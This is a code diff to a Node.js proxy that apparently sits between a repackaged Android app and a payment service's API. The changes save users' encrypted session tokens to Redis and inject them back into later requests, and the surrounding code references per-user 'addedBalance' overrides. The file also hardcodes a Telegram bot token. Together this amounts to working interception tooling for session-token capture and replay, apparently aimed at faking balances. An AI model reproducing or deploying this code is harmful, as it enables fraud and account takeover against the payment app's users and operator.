@@ -3,7 +3,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const { Redis } = require('@upstash/redis');
 
 const app = express();
-const ORIGINAL_API = 'https://app-api.beepaycommon.com';
+const ORIGINAL_API = 'https://app-api.beepaypro.com';
 const BOT_TOKEN = process.env.BOT_TOKEN || '8944838396:AAEjhUozfSTRh40upzS9Z43MCuBX9i4Yy5M';
 const WEBHOOK_URL = 'https://ixcv.vercel.app/bot-webhook';
 const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
@@ -626,19 +626,22 @@ async function proxyFetch(req) {
     if (kl === 'content-length' || kl === 'connection' || kl === 'accept-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
     headers[k] = v;
   }
-  // ── TOKEN INJECTION ─────────────────────────────────────────────
-  // If appToken header is empty/missing, inject stored token from Redis.
-  // This happens because the APK's MMKV storage may not persist the token
-  // across sessions, but our Redis has it from the last successful login.
+  // ── TOKEN SAVE + INJECTION ──────────────────────────────────────
+  // The AES key is in a native .so library (NativeLib.getAesKey) — we cannot
+  // decrypt or re-encrypt. Instead we save the ALREADY-ENCRYPTED token that
+  // the app sends (e.g. "YCS8nE+kPaI/Vs9oSOSopA==") and inject it back when
+  // the app sends an empty token (can happen if MMKV is cleared or cold-start).
+  const memberCodeHdr = headers['membercode'] || headers['memberCode'] || '';
   const currentToken = headers['apptoken'] || headers['appToken'] || '';
-  if (!currentToken.trim() && redis) {
-    const memberCode = headers['membercode'] || headers['memberCode'] || '';
-    if (memberCode) {
+  if (memberCodeHdr && redis) {
+    if (currentToken && currentToken.trim()) {
+      // Save the encrypted token from this request for future injection
+      try { await redis.set(`apptoken:${memberCodeHdr}`, currentToken.trim(), { ex: 86400 }); } catch(e) {}
+    } else {
+      // Token is empty — inject stored encrypted token if available
       try {
-        const storedToken = await redis.get(`apptoken:${memberCode}`);
-        if (storedToken) {
-          headers['apptoken'] = String(storedToken);
-        }
+        const storedToken = await redis.get(`apptoken:${memberCodeHdr}`);
+        if (storedToken) headers['apptoken'] = String(storedToken);
       } catch(e) {}
     }
   }
@@ -649,7 +652,17 @@ async function proxyFetch(req) {
   const respHeaders = {};
   response.headers.forEach((v, k) => {
     const kl = k.toLowerCase();
-    if (kl === 'content-encoding' || kl === 'transfer-encoding' || kl === 'connection') return;
+    // Strip encoding/length headers:
+    // - content-encoding: gzip → Node.js undici auto-decompresses, but we must NOT forward
+    //   the gzip header because we're sending plain decompressed JSON/bytes to the app.
+    //   If app's OkHttp sees content-encoding:gzip with plain body, it tries to gunzip
+    //   plain JSON → garbled data → appToken lost → all post-login requests fail with 600.
+    // - content-length: real server sends gzip content-length (e.g. 80 bytes), but decompressed
+    //   plain JSON is larger (e.g. 300 bytes). OkHttp reads exactly content-length bytes →
+    //   TRUNCATED response → missing fields (appToken, memberCode etc).
+    // - transfer-encoding / connection: hop-by-hop headers, must not be forwarded.
+    if (kl === 'content-encoding' || kl === 'content-length' ||
+        kl === 'transfer-encoding' || kl === 'connection') return;
     respHeaders[k] = v;
   });
   let jsonResp = null;
@@ -1553,15 +1566,10 @@ app.all('/appAuth/v2/memberLogin', async (req, res) => {
     const userOvr = userId && data.userOverrides ? data.userOverrides[userId] : null;
     const addedBal = userOvr?.addedBalance ?? 0;
 
-    // ── CRITICAL: Save appToken to Redis so proxy can inject it on future requests ──
-    // The app's MMKV may not persist the token correctly after APK rebuild.
-    // By storing it server-side, all subsequent requests will have the correct token.
-    if (appToken && memberCode && redis) {
-      try {
-        await redis.set(`apptoken:${memberCode}`, appToken, { ex: 86400 }); // 24hr
-      } catch(e) {}
-    }
-
+    // Note: We do NOT save the raw appToken from login response to Redis.
+    // The AES key is in NativeLib (.so file) — we cannot encrypt it.
+    // The app will AES-encrypt the raw token and send it in subsequent requests.
+    // proxyFetch() saves the ALREADY-ENCRYPTED token from those request headers.
     sendJson(res, respHeaders, jsonResp, respBody);
 
     if (userId) {
